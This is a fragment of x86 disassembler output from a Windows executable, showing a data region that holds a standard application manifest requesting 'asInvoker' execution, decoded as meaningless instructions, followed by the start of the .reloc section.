  4044e6:	cmp    ah,BYTE PTR [ecx+0x73]
  4044e9:	ins    DWORD PTR es:[edi],dx
  4044ea:	cs jbe 0x40451e
  4044ed:	and    ah,BYTE PTR [eax]
  4044ef:	ins    DWORD PTR es:[edi],dx
  4044f0:	popa   
  4044f1:	outs   dx,BYTE PTR ds:[esi]
  4044f2:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4044f9:	jb     0x40456e
  4044fb:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404502:	xor    BYTE PTR [edx],ah
  404504:	ds or  eax,0x3c20200a
  40450a:	popa   
  40450b:	jae    0x404580
  40450d:	gs ins DWORD PTR es:[edi],dx
  40450f:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404513:	fs outs dx,BYTE PTR gs:[esi]
  404516:	je     0x404581
  404518:	je     0x404593
  40451a:	and    BYTE PTR [esi+0x65],dh
  40451d:	jb     0x404592
  40451f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404526:	xor    BYTE PTR [esi],ch
  404528:	xor    BYTE PTR [esi],ch
  40452a:	xor    BYTE PTR [edx],ah
  40452c:	and    BYTE PTR [esi+0x61],ch
  40452f:	ins    DWORD PTR es:[edi],dx
  404530:	gs cmp eax,0x41794d22
  404536:	jo     0x4045a8
  404538:	ins    BYTE PTR es:[edi],dx
  404539:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404540:	cs popa 
  404542:	jo     0x4045b4
  404544:	and    ch,BYTE PTR [edi]
  404546:	ds or  eax,0x3c20200a
  40454c:	je     0x4045c0
  40454e:	jne    0x4045c3
  404550:	je     0x40459b
  404552:	outs   dx,BYTE PTR ds:[esi]
  404553:	outs   dx,WORD PTR ds:[esi]
  404555:	and    BYTE PTR [eax+0x6d],bh
  404558:	ins    BYTE PTR es:[edi],dx
  404559:	outs   dx,BYTE PTR ds:[esi]
  40455a:	jae    0x404599
  40455c:	and    dh,BYTE PTR [ebp+0x72]
  40455f:	outs   dx,BYTE PTR ds:[esi]
  404560:	cmp    dh,BYTE PTR [ebx+0x63]
  404563:	push   0x73616d65
  404568:	sub    eax,0x7263696d
  40456d:	outs   dx,DWORD PTR ds:[esi]
  40456e:	jae    0x4045df
  404570:	data16 je 0x4045a0
  404573:	arpl   WORD PTR [edi+0x6d],bp
  404576:	cmp    ah,BYTE PTR [ecx+0x73]
  404579:	ins    DWORD PTR es:[edi],dx
  40457a:	cs jbe 0x4045af
  40457d:	and    bh,BYTE PTR [esi]
  40457f:	or     eax,0x2020200a
  404584:	and    BYTE PTR [ebx+esi*2],bh
  404587:	arpl   WORD PTR gs:[ebp+0x72],si
  40458b:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404593:	and    BYTE PTR [eax],ah
  404595:	and    BYTE PTR [eax],ah
  404597:	cmp    al,0x72
  404599:	gs jno 0x404611
  40459c:	gs jae 0x404613
  40459f:	gs fs push eax
  4045a2:	jb     0x40460d
  4045a4:	jbe    0x40460f
  4045a6:	ins    BYTE PTR es:[edi],dx
  4045a7:	gs addr16 gs jae 0x4045cc
  4045ac:	js     0x40461b
  4045ae:	ins    BYTE PTR es:[edi],dx
  4045af:	outs   dx,BYTE PTR ds:[esi]
  4045b0:	jae    0x4045ef
  4045b2:	and    dh,BYTE PTR [ebp+0x72]
  4045b5:	outs   dx,BYTE PTR ds:[esi]
  4045b6:	cmp    dh,BYTE PTR [ebx+0x63]
  4045b9:	push   0x73616d65
  4045be:	sub    eax,0x7263696d
  4045c3:	outs   dx,DWORD PTR ds:[esi]
  4045c4:	jae    0x404635
  4045c6:	data16 je 0x4045f6
  4045c9:	arpl   WORD PTR [edi+0x6d],bp
  4045cc:	cmp    ah,BYTE PTR [ecx+0x73]
  4045cf:	ins    DWORD PTR es:[edi],dx
  4045d0:	cs jbe 0x404606
  4045d3:	and    bh,BYTE PTR [esi]
  4045d5:	or     eax,0x2020200a
  4045da:	and    BYTE PTR [eax],ah
  4045dc:	and    BYTE PTR [eax],ah
  4045de:	and    BYTE PTR [edx+esi*2],bh
  4045e1:	gs jno 0x404659
  4045e4:	gs jae 0x40465b
  4045e7:	gs fs inc ebp
  4045ea:	js     0x404651
  4045ec:	arpl   WORD PTR [ebp+0x74],si
  4045ef:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4045f6:	ins    BYTE PTR es:[edi],dx
  4045f7:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4045fb:	gs ins BYTE PTR es:[edi],dx
  4045fd:	cmp    eax,0x49736122
  404602:	outs   dx,BYTE PTR ds:[esi]
  404603:	jbe    0x404674
  404605:	imul   esp,DWORD PTR [ebp+0x72],0x22
  404609:	and    BYTE PTR [ebp+0x69],dh
  40460c:	inc    ecx
  40460d:	arpl   WORD PTR [ebx+0x65],sp
  404610:	jae    0x404685
  404612:	cmp    eax,0x6c616622
  404617:	jae    0x40467e
  404619:	and    ch,BYTE PTR [edi]
  40461b:	ds or  eax,0x2020200a
  404621:	and    BYTE PTR [eax],ah
  404623:	and    BYTE PTR [edi+ebp*1],bh
  404626:	jb     0x40468d
  404628:	jno    0x40469f
  40462a:	gs jae 0x4046a1
  40462d:	gs fs push eax
  404630:	jb     0x40469b
  404632:	jbe    0x40469d
  404634:	ins    BYTE PTR es:[edi],dx
  404635:	gs addr16 gs jae 0x404678
  40463a:	or     eax,0x2020200a
  40463f:	and    BYTE PTR [edi+ebp*1],bh
  404642:	jae    0x4046a9
  404644:	arpl   WORD PTR [ebp+0x72],si
  404647:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40464f:	cmp    al,0x2f
  404651:	je     0x4046c5
  404653:	jne    0x4046c8
  404655:	je     0x4046a0
  404657:	outs   dx,BYTE PTR ds:[esi]
  404658:	outs   dx,WORD PTR ds:[esi]
  40465a:	ds or  eax,0x612f3c0a
  404660:	jae    0x4046d5
  404662:	gs ins DWORD PTR es:[edi],dx
  404664:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404668:	or     eax,0xa
  40466d:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00406000 <.reloc>:
  406000:	add    BYTE PTR [eax],dh
  406002:	add    BYTE PTR [eax],al
  406004:	or     al,0x0
  406006:	add    BYTE PTR [eax],al
  406008:	lock cmp al,0x0
	...
